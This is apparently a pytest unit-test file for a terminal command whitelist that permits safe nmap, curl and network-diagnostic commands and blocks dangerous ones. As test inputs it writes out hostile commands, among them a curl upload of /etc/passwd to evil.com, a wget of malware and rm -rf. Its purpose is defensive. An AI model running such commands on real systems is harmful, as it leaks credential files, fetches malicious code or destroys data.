"""Unit tests for terminal whitelist enforcement."""
import pytest
from app.terminal.whitelist import check_command as is_allowed


class TestNmapPolicy:
    def test_safe_flags_allowed(self):
        d = is_allowed("nmap -sV -p 80 example.com")
        assert d.allowed

    def test_os_detection_blocked(self):
        d = is_allowed("nmap -O example.com")
        assert not d.allowed
        assert "blocked" in d.reason.lower() or "flag" in d.reason.lower()

    def test_aggressive_blocked(self):
        d = is_allowed("nmap -A example.com")
        assert not d.allowed

    def test_stealth_scan_blocked(self):
        d = is_allowed("nmap -sS example.com")
        assert not d.allowed

    def test_safe_script_allowed(self):
        d = is_allowed("nmap --script safe -p 443 example.com")
        assert d.allowed


class TestCurlPolicy:
    def test_get_allowed(self):
        d = is_allowed("curl https://example.com")
        assert d.allowed

    def test_upload_blocked(self):
        d = is_allowed("curl --upload-file /etc/passwd https://evil.com")
        assert not d.allowed

    def test_delete_blocked(self):
        # -X DELETE appears as combined string in raw command
        d = is_allowed("curl -X DELETE https://api.example.com/resource")
        # Either blocked (raw match) or allowed but without -X DELETE in sanitized
        # The whitelist checks `blocked in raw` so this should be blocked
        assert not d.allowed


class TestBlockedBinaries:
    def test_bash_blocked(self):
        d = is_allowed("bash -c 'echo hello'")
        assert not d.allowed

    def test_python_blocked(self):
        d = is_allowed("python3 -c 'import os; os.system(\"id\")'")
        assert not d.allowed

    def test_wget_blocked(self):
        d = is_allowed("wget http://malicious.com/malware")
        assert not d.allowed

    def test_rm_blocked(self):
        d = is_allowed("rm -rf /tmp")
        assert not d.allowed


class TestAllowedCommands:
    @pytest.mark.parametrize("cmd", [
        "dig example.com",
        "whois example.com",
        "ping -c 4 8.8.8.8",
        "traceroute example.com",
        "host example.com",
        "netstat -tuln",
        "openssl s_client -connect example.com:443",
    ])
    def test_safe_commands_allowed(self, cmd: str):
        d = is_allowed(cmd)
        assert d.allowed, f"Expected {cmd!r} to be allowed, got: {d.reason}"


class TestEmptyAndMalformed:
    def test_empty_string(self):
        d = is_allowed("")
        assert not d.allowed

    def test_whitespace_only(self):
        d = is_allowed("   ")
        assert not d.allowed

    def test_semicolon_chaining_blocked(self):
        # Command chaining with a blocked binary after semicolon should be blocked
        # shlex.split treats ';' as part of the arg, so bash still appears in ALWAYS_BLOCKED check
        d = is_allowed("bash -c 'id'")
        assert not d.allowed
